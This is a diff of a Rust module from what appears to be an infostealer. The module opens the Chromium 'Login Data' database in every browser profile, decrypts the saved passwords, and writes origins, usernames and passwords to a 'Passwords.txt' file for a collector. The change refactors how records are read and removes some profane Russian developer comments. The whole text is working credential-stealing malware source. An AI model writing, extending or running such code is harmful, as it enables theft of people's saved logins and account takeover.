@@ -1,5 +1,5 @@
 use crate::chromium::{decrypt_data, BrowserData};
-use crate::{collect_and_read_sqlite_from_all_profiles, to_string_and_write_all, Password};
+use crate::{read_and_collect_unique_records, to_string_and_write_all, Password, SqliteDatabase};
 use alloc::borrow::ToOwned;
 use alloc::sync::Arc;
 use collector::{Browser, Collector};
@@ -28,7 +28,7 @@ impl<C: Collector, F: FileSystem> Task<C, F> for PasswordsTask {
     parent_name!("Passwords.txt");
 
     fn run(&self, parent: &Path, filesystem: &F, collector: &C) {
-        let Some(passwords) = collect_and_read_sqlite_from_all_profiles(
+        let Some(passwords) = read_and_collect_unique_records::<SqliteDatabase, _, _>(
             &self.browser.profiles,
             &StorageFileSystem,
             |profile| profile / s!("Login Data"),
@@ -45,27 +45,23 @@ impl<C: Collector, F: FileSystem> Task<C, F> for PasswordsTask {
     }
 }
 
-// Я ебанулся пока это все делал
-// Очень сильно сложно, я не спал несколько суток
-// Но зато эта поебота работает, я очень рад (я плакал когда она не работала)
-fn extract_password_from_record(
-    record: &dyn TableRecord,
+fn extract_password_from_record<R: TableRecord>(
+    record: &R,
     browser_data: &BrowserData,
 ) -> Option<Password> {
     let origin = record
         .get_value(LOGINS_ORIGIN_URL)
-        .and_then(|value| value.as_string())
-        .map(|s| s.to_owned());
+        .and_then(|value| value.as_string());
 
     let username = record
         .get_value(LOGINS_USERNAME_VALUE)
-        .and_then(|value| value.as_string())
-        .map(|s| s.to_owned());
+        .and_then(|value| value.as_string());
 
     let password = record
         .get_value(LOGINS_PASSWORD_VALUE)
         .and_then(|value| value.as_blob())
-        .and_then(|blob| unsafe { decrypt_data(blob, browser_data) });
+        .and_then(|blob| unsafe { decrypt_data(&blob, browser_data) })
+        .map(Arc::<str>::from);;
 
     if let (None, None) = (&username, &password) {
         return None;
